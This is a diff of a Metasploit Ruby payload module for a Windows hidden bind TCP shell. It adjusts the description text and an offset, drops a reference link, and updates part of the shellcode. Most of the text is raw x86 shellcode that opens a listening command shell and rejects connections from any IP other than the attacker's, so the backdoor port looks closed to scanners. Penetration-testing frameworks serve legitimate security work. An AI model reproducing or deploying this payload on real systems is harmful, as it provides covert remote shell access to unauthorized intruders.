@@ -18,9 +18,9 @@ module Metasploit3
     super(merge_info(info,
       'Name'          => 'Windows Command Shell, Hidden Bind TCP Inline',
       'Description'   => 'Listen for a connection from certain IP and spawn a command shell.
-                          The shellcode will reply with a RST packet if the connection is not
-                          comming from the IP defined in AHOST. This way the socket will appear
-                          as "closed" helping us to keep our shellcode hidden from scanning tools.',
+                          The shellcode will reply with a RST packet if the connections is not
+                          comming from the IP defined in AHOST. This way the port will appear
+                          as "closed" helping us to hide the shellcode.',
       'Author'        =>
         [
           'vlad902',    # original payload module (single_shell_bind_tcp)
@@ -28,7 +28,6 @@ module Metasploit3
           'Borja Merino <bmerinofe[at]gmail.com>'	# Add Hidden ACL functionality
         ],
       'License'       => MSF_LICENSE,
-      'References'    => ['URL', 'http://www.youtube.com/watch?v=xYBuaVNQjGA&hd=1'],
       'Platform'      => 'win',
       'Arch'          => ARCH_X86,
       'Handler'       => Msf::Handler::BindHiddenTcp,
@@ -39,7 +38,7 @@ module Metasploit3
             {
               'LPORT'    => [ 200, 'n' ],
               'AHOST'    => [ 262, 'ADDR' ],
-              'EXITFUNC' => [ 364, 'V' ],
+              'EXITFUNC' => [ 363, 'V' ],
             },
           'Payload' =>
       "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b" +
@@ -59,14 +58,14 @@ module Metasploit3
       "\xff\xff\x00\x00\x57\x68\xf1\xa2\x77\x29\xff\xd5\x53\x57\x68\xb7" +
       "\xe9\x38\xff\xff\xd5\x53\xe8\x17\x00\x00\x00\x8b\x44\x24\x04\x8b" +
       "\x40\x04\x8b\x40\x04\x2d\xc0\xa8\x01\x21\x74\x03\x31\xc0\x40\xc2" +
-      "\x20\x00\x53\x53\x57\x68\x94\xac\xbe\x33\xff\xd5\x83\xf8\xff\x74" +
-      "\xd4\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89" +
-      "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24" +
-      "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46" +
-      "\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e" +
-      "\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a" +
-      "\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05" +
-      "\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+      "\x20\x00\x53\x53\x57\x68\x94\xac\xbe\x33\xff\xd5\x40\x74\xd6\x48" +
+      "\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" +
+      "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c" +
+      "\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56" +
+      "\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56" +
+      "\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68" +
+      "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" +
+      "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
         }
       ))
   end
